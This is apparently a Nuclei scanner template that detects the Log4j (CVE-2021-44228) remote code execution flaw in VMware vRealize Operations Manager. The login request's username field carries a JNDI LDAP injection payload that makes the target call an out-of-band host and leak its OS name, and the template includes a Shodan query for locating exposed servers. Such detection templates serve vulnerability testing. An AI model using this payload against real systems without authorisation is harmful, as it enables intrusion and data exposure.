id: vmware-operation-manager-log4j
info:
  name: VMware Operations Manager - Remote Code Execution (Apache Log4j)
  author: DhiyaneshDK
  severity: critical
  description: VMware Operations Manager is vulnerable to remote code execution through
    Apache Log4j, allowing an attacker to take control of the system without needing
    credentials.
  reference:
  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"vRealize Operations Manager"
    verified: 'true'
    impact: The vulnerability in VMware Operations Manager's use of Apache Log4j framework
      can result in extensive harm to the system and sensitive data due to remote
      code execution.
    recommendation: It is highly recommended to update VMware Operations Manager to
      mitigate the risk of remote code execution via the Apache Log4j framework.
  tags: cve,cve2021,rce,jndi,log4j,vmware,kev,oast
requests:
- raw:
  - 'POST /ui/login.action HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}/ui/login.action

    Sec-Fetch-Dest: empty

    Sec-Fetch-Mode: cors

    Sec-Fetch-Site: same-origin


    mainAction=login&userName=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
  - type: word
    part: header
    words:
    - Path=/ui
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
